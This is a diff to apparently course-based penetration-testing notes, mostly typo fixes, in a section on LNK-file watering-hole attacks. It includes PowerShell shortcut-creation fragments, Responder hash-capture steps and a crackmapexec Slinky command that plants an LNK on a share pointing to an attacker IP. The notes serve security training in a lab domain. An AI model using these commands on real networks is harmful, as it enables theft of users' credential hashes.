@@ -248,9 +248,9 @@ Gaining semi-reverse shell connection with custom .ps1 script.
 ---
 
 ## 🚩 LNK File Attacks (Windows Hash Capture)  
-In this scenario, we have the ability to setup a watering hole attack. By generating a malicious lnk using powershel. We could place a lnk file inside file shares of a network. And have responder listening within the same netwrok to recieve the commands set in the lnk.  
+In this scenario, we have the ability to setup a watering hole attack. By generating a malicious lnk using powershel. We could place a lnk file inside file shares of a network. And have responder listening within the same network to recieve the commands set in the lnk.  
 
-This can be used in the event when we are having trouble gaining further access or elevating priviliges. However we have access to a network file share. If the lnk can be succesfully placed in this shared location, anyone that access it (Automaticl refresh) it will execute the lnk with the commnands sent back to the attacking machine.  
+This can be used in the event when we are having trouble gaining further access or elevating priviliges. However we need to have access to a network file share. If the lnk can be succesfully placed in this shared location, anyone that access it (Automatic refresh) could potentially execute the lnk with the commnands sent back to the attacking machine.  
 
 1. Run Admin Powershell command to create lnk for hash captures:
 2. Run Responder for HASH CAPTURE not RELAY (WPAD OFF)
@@ -264,7 +264,7 @@ This can be used in the event when we are having trouble gaining further access 
         $lnk.HotKey = "Ctrl+Alt+T"
         $lnk.Save()
 
-crackmapexec / netexec using module -M Slinky, to implant a lnk into a 'file share' on the network if there is one identified and also exposed. Without the requirement to access the target machine your self.  
+**crackmapexec / netexec using module -M Slinky, to implant a lnk into a 'file share' on the network if there is one identified and also exposed, without the requirement to access the target machine your self.**  
 
     crackmapexec smb <target IP> -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=<attacker IP>  
     
